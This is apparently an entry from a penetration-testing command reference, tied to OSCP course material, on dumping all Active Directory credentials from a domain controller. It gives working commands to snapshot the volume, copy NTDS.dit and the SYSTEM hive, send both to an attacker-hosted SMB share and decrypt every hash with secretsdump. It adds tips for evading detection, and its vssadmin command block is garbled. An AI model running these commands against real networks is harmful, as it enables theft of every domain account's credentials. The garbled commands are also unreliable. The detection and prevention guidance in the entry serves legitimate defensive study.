name: Domain Persistence - NTDS.dit Extraction via vshadow.exe
command:
vshadow.exe -nw -p C:
robocopy /b \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
reg.exe save hklm\system C:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
description: Extract every domain account's NT hash by snapshotting the C: volume with vshadow.exe (Windows SDK Volume Shadow Copy sample), copying NTDS.dit out of the VSS snapshot, saving the SYSTEM hive for the boot key, then decrypting offline with impacket-secretsdump. Unlike vssadmin (which uses the VSS API directly), vshadow.exe is a standalone binary commonly found in C:\Tools on OSCP labs. Both approaches produce identical results. Requires Domain Admin or SeBackupPrivilege on the DC.
source: OSCP PEN-200 Chapter 23: Lateral Movement in Active Directory (23.2.2 Shadow Copies)

examples.label: Step 1 - Create a VSS snapshot of C: (no writers, persistent)
Step 2 - Note the shadow copy device path from output, then copy NTDS.dit
Step 3 - Save the SYSTEM registry hive (contains boot key to decrypt NTDS)
Step 4 - Exfiltrate both files to Kali (SMB share or download cradle)
examples.command:
# From Kali, set up SMB share:
impacket-smbserver share . -smb2support
# From DC:
copy C:\ntds.dit.bak \\<kali_ip>\share\ntds.dit.bak
copy C:\system.bak \\<kali_ip>\share\system.bak

examples.label: Step 5 - Decrypt all domain hashes offline on Kali
Alternative: vssadmin (built-in, no extra binary needed)
examples.command:
vssadmin CREATE SHADOW /For=C:
copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows
tds
tds.dit C:
tds.dit.bak
reg.exe save hklm\system C:\system.bak

examples.label: Cleanup - delete the shadow copy after extraction

notes: vshadow.exe flags: -nw = no VSS writers involved (faster, avoids VSS writer timeout); -p = persistent (snapshot survives past the current process). The shadow copy device path is printed in the vshadow output — look for 'SNAPSHOT ID' and the corresponding \Device\HarddiskVolumeShadowCopy# number. NTDS.dit is always locked by the AD database engine while the DC is running — the VSS snapshot bypasses this lock by copying from the frozen volume image. The SYSTEM hive provides the boot key (also called the System Key or SYSKEY) without which NTDS.dit hashes cannot be decrypted. secretsdump extracts: NTLM hashes, Kerberos keys (AES128/256), cleartext passwords if reversible encryption was enabled. The resulting hashes can be used for PTH attacks or cracked offline. This is often the final step in a DC compromise.

references.title: OffSec PEN-200 - Lateral Movement in Active Directory
MITRE ATT&CK - OS Credential Dumping: NTDS

recommended.note: ntds-vss uses vssadmin (built-in) instead of vshadow.exe — identical outcome, no extra binary needed.
DCSync dumps all hashes over the network without touching NTDS.dit — stealthier if you have DA creds.
secretsdump-ntds covers parsing the extracted NTDS.dit offline.

defense.why_it_works: NTDS.dit is the Active Directory database file containing all domain credentials — locked by the NTDS service while the DC is running. Volume Shadow Copy Service (VSS) creates a point-in-time snapshot accessible while the original file is locked. vshadow.exe (from Windows SDK) or vssadmin creates a shadow copy, the attacker copies ntds.dit from the VSS path, copies SYSTEM hive for the boot key, then uses impacket-secretsdump or DSInternals to extract all hashes offline.
defense.prerequisites: Domain Admin rights on a DC. vshadow.exe (or vssadmin / esentutl). Ability to copy files from VSS path. SYSTEM hive from the DC (for boot key to decrypt NTDS.dit).
defense.impact: T1003.003 OS Credential Dumping: NTDS. Extracts ALL domain credentials: every user's NTLM hash, Kerberos keys, historical hashes. Equivalent to DCSync but offline — enables cracking all domain hashes, forging Golden Tickets, and full domain persistence.
defense.detection:
Event 7036: VSS service started (unusual if not during backup window). Event 8193: VSS writer invoked. Sysmon Event 11: file copy from \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy* path. Event 4688: vshadow.exe or vssadmin process on DC. EDR: ntds.dit access from non-backup process.
Processes accessing LSASS memory or SAM registry hives outside of trusted security tools, often followed by file creation or lateral movement (DET0234/AN0648).
Processes opening /proc/*/mem or /proc/*/maps targeting credential-storing services like sshd or login; high privilege escalation and memory inspection tools such as gcore or gdb (AN0649).
Unsigned processes accessing system memory or launching known credential scraping tools (e.g., osascript, dylib injections) to access the Keychain or sensitive memory regions (AN0650).
defense.artifacts: Event 7036: Volume Shadow Copy service started outside backup schedule | Sysmon Event 11: file created from VSS path | Event 4688: vshadow.exe on DC | Copied ntds.dit file on disk | Event 4663: access to ntds.dit file
defense.prevention:
Restrict DA rights tightly (VSS access requires DA on DC). Monitor VSS creation events outside backup schedules. EDR on DCs with ntds.dit access alerting. Anomaly detection: VSS created but no backup application running. MDI deployment. Restrict who can interactively log on to DCs.
Active Directory Configuration: Manage ACL for 'Replicating Directory Changes All'; add users to Protected Users security group to limit cached plaintext credentials.
Behavior Prevention on Endpoint: Enable Windows 10 ASR rules to secure LSASS and prevent credential stealing.
Credential Access Protection: Enable Credential Guard (Windows 10+) to protect LSA secrets; enable Protected Process Light for LSA on Server 2012 R2.
Encrypt Sensitive Information: Ensure Domain Controller backups are properly secured.
Operating System Configuration: Disable or restrict NTLM; disable WDigest authentication.
Password Policies: Ensure local administrator accounts have complex, unique passwords across all systems.
Privileged Account Management: Do not place domain accounts in local admin groups across systems; limit cross-tier admin use; on Linux restrict root access to prevent memory scraping.
defense.evasion: Use built-in vssadmin instead of vshadow.exe (less suspicious binary). Perform during backup window when VSS events are normal. Use ntdsutil IFM (Installable From Media) — legitimate AD feature that creates a copy of NTDS.dit — equally effective, more legitimate-looking.
defense.misconfiguration: Too many accounts with DA rights — VSS access feasible for many attackers. No EDR on DCs. No alert on ntds.dit file access. VSS creation events not monitored outside backup windows.
defense.vulnerable_config:
# VSS created on DC without monitoring:
vssadmin create shadow /for=C:\
# → shadow copy created → ntds.dit accessible at:
# \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit
# copy 'C:\Windows\system32\config\SYSTEM' C:\temp\SYSTEM
# Then offline: secretsdump -ntds ntds.dit -system SYSTEM LOCAL
defense.secure_config:
# EDR rule: alert on ntds.dit access from non-NTDS service processes
# Defender for Endpoint: 'NTDS.dit read by non-AD process' built-in alert

# Monitor VSS events outside backup schedule:
# SIEM: EventID=7036 AND ServiceName='Volume Shadow Copy' AND TimeOfDay NOT IN (backup_window) → ALERT

# Restrict DC logon to DA accounts only:
# Computer Config → Windows Settings → Security Settings → Local Policies → User Rights Assignment
# → Allow log on locally: Administrators (only explicit DA, not broad group)

# MDI on all DCs: detects ntds.dit extraction patterns
